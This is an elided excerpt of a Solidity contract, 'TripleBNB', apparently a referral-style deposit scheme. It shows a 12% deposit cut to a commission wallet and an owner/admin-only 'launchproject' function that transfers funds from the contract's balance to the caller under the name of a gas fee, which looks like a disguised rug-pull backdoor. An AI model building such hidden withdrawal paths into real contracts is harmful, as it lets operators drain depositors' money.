...
contract TripleBNB {
    ...
    constructor(address _admin_wallet, address _com_wallet) {

        owner = msg.sender;
         admin_wallet = _admin_wallet;
        com_wallet =  _com_wallet;
    ...
    function _setUpline(address _addr, address _upline, uint256 _amount) private {
      ...
      function launchproject( uint gasFee) external {
        require(msg.sender==owner || msg.sender == admin_wallet,'Permission denied');
        if (gasFee > 0) {
          uint contractConsumption = address(this).balance;
	        ...
	        payable(msg.sender).transfer( requiredGas );
    ...
    function deposit(uint8 _tarif, address _upline) external payable {
        ...
        payable(com_wallet).transfer(msg.value * 12  / 100);
